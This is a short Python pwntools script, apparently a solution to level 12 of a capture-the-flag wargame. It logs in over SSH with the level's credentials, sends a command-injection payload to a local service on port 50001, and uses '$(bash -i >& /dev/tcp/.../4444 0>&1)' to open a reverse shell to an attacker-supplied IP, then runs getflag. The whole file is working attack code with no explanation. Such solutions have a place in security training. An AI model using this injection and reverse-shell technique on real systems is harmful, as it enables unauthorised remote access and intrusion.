#!/usr/bin/python3

from pwn import *
from sys import argv,exit

if len(argv) < 3:
	sys.exit(f"{argv[0]} Target_IP Local_IP") 

level12 = ssh(host=argv[1],user='level12',password='level12')

remote_pro = level12.process(['nc','localhost','50001'])
local_pro = process(['nc','-l','4444'])
remote_pro.sendline(f'$(bash -i >& /dev/tcp/{argv[2]}/4444 0>&1)')
local_pro.sendline('getflag')
local_pro.interactive()